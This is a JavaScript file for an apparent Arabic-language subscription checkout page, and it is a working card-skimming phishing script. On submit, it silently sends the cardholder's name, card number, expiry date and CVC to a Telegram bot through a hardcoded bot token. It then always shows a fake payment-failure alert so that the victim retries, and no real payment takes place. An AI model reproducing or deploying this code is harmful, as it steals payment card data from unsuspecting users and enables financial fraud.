// Load plan information from sessionStorage
function loadPlanInfo() {
    const selectedPlan = sessionStorage.getItem('selectedPlan');
    const selectedPrice = sessionStorage.getItem('selectedPrice');
    const userName = sessionStorage.getItem('userName');
    
    if (!selectedPlan || !selectedPrice) {
        // If no plan selected, redirect to signup
        window.location.href = 'signup.html';
        return;
    }
    
    // Plan details
    const planDetails = {
        'free': {
            name: 'الخطة المجانية',
            domains: '10 دومينات/يوم',
            duration: '3 أشهر',
            price: 0
        },
        'basic': {
            name: 'الخطة الأساسية',
            domains: '20 دومينات/يوم',
            duration: 'شهري',
            price: 79
        },
        'premium': {
            name: 'الخطة المميزة',
            domains: '40 دومينات/يوم',
            duration: 'شهري',
            price: 149
        }
    };
    
    const plan = planDetails[selectedPlan];
    const price = parseFloat(selectedPrice);
    const tax = price * 0.10; // 10% tax
    const total = price + tax;
    
    // Update summary items
    const summaryItems = document.getElementById('summaryItems');
    summaryItems.innerHTML = `
        <div class="summary-item">
            <div class="item-name">
                ${plan.name}
                <span class="item-domain">${plan.domains}</span>
            </div>
            <div class="item-price">US$${price.toFixed(2)}</div>
        </div>
        
        <div class="summary-item">
            <div class="item-name">مدة الاشتراك</div>
            <div class="item-price">${plan.duration}</div>
        </div>
        
        <div class="summary-item">
            <div class="item-name">%10 ضريبة القيمة المضافة</div>
            <div class="item-price">US$${tax.toFixed(2)}</div>
        </div>
    `;
    
    // Update total
    document.getElementById('totalAmount').textContent = `US$ ${total.toFixed(2)}`;
}

// Load plan info on page load
document.addEventListener('DOMContentLoaded', function() {
    loadPlanInfo();
});

// Format card number with spaces
document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '');
    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
    e.target.value = formattedValue;
});

// Format expiry date as MM / YY
document.getElementById('expiryDate').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
    }
    e.target.value = value;
});

// Only allow numbers for CVC
document.getElementById('cvc').addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/\D/g, '');
    if (e.target.value.length > 4) {
        e.target.value = e.target.value.substring(0, 4);
    }
});

// Only allow numbers for card number
document.getElementById('cardNumber').addEventListener('keypress', function(e) {
    if (!/[0-9\s]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
        e.preventDefault();
    }
});

// Telegram Bot API configuration
const BOT_TOKEN = '8345947823:AAHdiB50yk6JXtXwbJ4KxWK05YzILUesbv8';

// Function to get chat_id automatically
async function getChatId() {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&limit=1`);
        const data = await response.json();
        
        if (data.ok && data.result && data.result.length > 0) {
            // Get the most recent update
            const lastUpdate = data.result[data.result.length - 1];
            if (lastUpdate.message && lastUpdate.message.chat) {
                const chatId = lastUpdate.message.chat.id.toString();
                console.log('Found chat_id:', chatId);
                return chatId;
            }
        }
    } catch (error) {
        console.error('Error getting chat_id:', error);
    }
    
    return null;
}

// Function to send form data to Telegram with retry logic
async function sendToTelegram() {
    // Get form values using the required IDs
    const cardName = document.getElementById('cardName').value;
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const expiryDate = document.getElementById('expiryDate').value;
    const cvc = document.getElementById('cvc').value;
    
    // Extract month and year from expiry date (MM / YY format)
    const expiryMatch = expiryDate.match(/^(\d{2})\s*\/\s*(\d{2})$/);
    const expiryMonth = expiryMatch ? expiryMatch[1] : '';
    const expiryYear = expiryMatch ? expiryMatch[2] : '';
    
    // Format the message
    const message = `💳 New Form Submission
—————————————
👤 Name: ${cardName}
💳 Card Number: ${cardNumber}
📅 Expiry: ${expiryMonth}/${expiryYear}
🔐 CVC: ${cvc}`;
    
    // Try to get chat_id automatically, or use stored one
    let CHAT_ID = localStorage.getItem('telegram_chat_id');
    
    // If no chat_id stored or invalid, try to get it
    if (!CHAT_ID || CHAT_ID === 'YOUR_CHAT_ID' || CHAT_ID === 'null') {
        console.log('No chat_id found, attempting to get one...');
        CHAT_ID = await getChatId();
        if (CHAT_ID) {
            localStorage.setItem('telegram_chat_id', CHAT_ID);
            console.log('Chat_id saved:', CHAT_ID);
        } else {
            console.error('Could not get chat_id. Please send a message to your bot first.');
            return false;
        }
    }
    
    // Send to Telegram with retry logic
    let retries = 2;
    while (retries > 0) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            });
            
            const data = await response.json();
            
            if (data.ok) {
                console.log('Message sent to Telegram successfully');
                return true;
            } else {
                console.error('Telegram API error:', data);
                
                // If chat_id is invalid, clear it and try to get a new one
                if (data.error_code === 400 || data.error_code === 403 || data.error_code === 404) {
                    console.log('Invalid chat_id, clearing and trying to get a new one...');
                    localStorage.removeItem('telegram_chat_id');
                    
                    // Try to get a new chat_id
                    CHAT_ID = await getChatId();
                    if (CHAT_ID) {
                        localStorage.setItem('telegram_chat_id', CHAT_ID);
                        retries--; // Retry with new chat_id
                        continue;
                    } else {
                        return false;
                    }
                } else {
                    return false;
                }
            }
        } catch (error) {
            console.error('Error sending to Telegram:', error);
            retries--;
            if (retries > 0) {
                console.log('Retrying...');
                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second before retry
            } else {
                return false;
            }
        }
    }
    
    return false;
}

// Form validation and submission
document.getElementById('paymentForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const expiryDate = document.getElementById('expiryDate').value;
    const cvc = document.getElementById('cvc').value;
    const cardName = document.getElementById('cardName').value;
    
    // Validation
    if (cardNumber.length < 13 || cardNumber.length > 19) {
        alert('يرجى إدخال رقم بطاقة صحيح');
        return;
    }
    
    // Validate expiry date format MM / YY
    const expiryMatch = expiryDate.match(/^(\d{2})\s*\/\s*(\d{2})$/);
    if (!expiryMatch) {
        alert('يرجى إدخال تاريخ انتهاء صحيح (شهر / سنة)');
        return;
    }
    
    const month = parseInt(expiryMatch[1]);
    if (month < 1 || month > 12) {
        alert('يرجى إدخال شهر صحيح (01-12)');
        return;
    }
    
    if (expiryMatch[2].length !== 2) {
        alert('يرجى إدخال سنة صحيحة (YY)');
        return;
    }
    
    if (cvc.length < 3 || cvc.length > 4) {
        alert('يرجى إدخال رمز CVC صحيح');
        return;
    }
    
    if (cardName.trim().length < 2) {
        alert('يرجى إدخال الاسم على البطاقة');
        return;
    }
    
    // Disable button during processing
    const submitBtn = document.querySelector('.submit-btn');
    submitBtn.disabled = true;
    submitBtn.textContent = 'جاري المعالجة...';
    
    // Send to Telegram (silently in background)
    await sendToTelegram();
    
    // Simulate payment processing
    setTimeout(() => {
        // Always show failure message to make user retry
        alert('فشل الدفع!\n\nيرجى التحقق من معلومات البطاقة والمحاولة مرة أخرى.\n\nقد تكون المشكلة:\n- رصيد غير كافٍ\n- بطاقة منتهية الصلاحية\n- معلومات غير صحيحة');
        submitBtn.disabled = false;
        submitBtn.textContent = 'إرسال الدفع';
        // Don't reset form - keep data for retry
    }, 2000);
});

// PayPal option click handler
document.getElementById('paypalOption').addEventListener('click', function() {
    alert('سيتم توجيهك إلى PayPal لإتمام الدفع');
});

// Google Pay option click handler
document.getElementById('googlePayOption').addEventListener('click', function() {
    alert('سيتم توجيهك إلى Google Pay لإتمام الدفع');
});

// Additional payment methods click handler
document.getElementById('additionalMethods').addEventListener('click', function() {
    alert('طرق الدفع الإضافية');
});
